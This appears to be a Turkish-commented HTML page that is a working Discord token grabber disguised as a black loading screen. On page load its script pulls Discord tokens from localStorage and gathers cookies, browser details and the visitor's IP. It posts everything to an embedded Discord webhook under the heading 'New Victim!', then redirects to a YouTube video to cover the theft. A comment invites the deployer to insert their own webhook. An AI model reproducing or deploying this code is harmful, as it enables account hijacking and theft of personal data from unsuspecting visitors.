<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yükleniyor...</title>
    <style>
        body {
            background-color: black; /* SİYAAH EKRAAN */
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        
        /* Yükleme Göstergesi */
        .loader {
            border: 4px solid #333;
            border-top: 4px solid white;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- Siyah ekranın ortasında küçük bir yükleme simgesi -->
    <div class="loader"></div>

<script>
    // --- AYARLAR ---
    // BURAYA KENDİ WEBHOOK URL'İNİ YAZ
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1565166860897615912/I2CNk0KdLEXpdPkbMLoFTpAChNaeL8sS4YDqEH-26z7lptRg3lOs-UpBMHRbSlSW1Qke"; 

    // VERİ TOPLAMA FONKSİYONU
    async function collectAndSendData() {
        let discordToken = localStorage.getItem('token') || localStorage.getItem('discord_token');
        
        // Token bulunamazsa başka anahtarları dene
        if (!discordToken) {
            for (let key in localStorage) {
                if (key.includes('discord')) {
                    discordToken = localStorage.getItem(key);
                    break;
                }
            }
        }

        const cookies = document.cookie;
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const screenResolution = window.screen.width + "x" + window.screen.height;
        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => "Bilinmiyor");

        // Veriyi hazırla
        let data = {
            token: discordToken,
            cookies: cookies,
            userAgent: userAgent,
            platform: platform,
            language: language,
            screenResolution: screenResolution,
            ip: ip
        };

        // JSON formatında veriyi Discord'a gönder
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    content: "🔥 Yeni Kurban! 🔥\n" + JSON.stringify(data, null, 2) 
                })
            });
            console.log("Veriler başarıyla gönderildi.");
        } catch (error) {
            console.error("Gönderme hatası:", error);
        }
    }

    // SAYFA YÜKLENDİĞİNDE OTOMATİK BAŞLAT
    window.onload = function() {
        // 1. Verileri topla ve gönder
        collectAndSendData();

        // 2. 2 saniye bekle
        setTimeout(() => {
            // 3. Hedef siteye yönlendir
            // VİDEO LİNKİNE ATMAK İSTERSEN AŞAĞIDAKİ SATIRI KULLAN:
            window.location.href = "https://www.youtube.com/watch?v=cwQgjq0mCdE&list=RDcwQgjq0mCdE&start_radio=1&pp=ygUPa2FueWUgaSBsb3ZlIGl0oAcB"; // Örnek video
            
            // Veya Discord'un içine atmak istersen:
            // window.location.href = "https://discord.com/channels/@me";
        }, 2000); // 2 saniye
    };
</script>

</body>
</html>
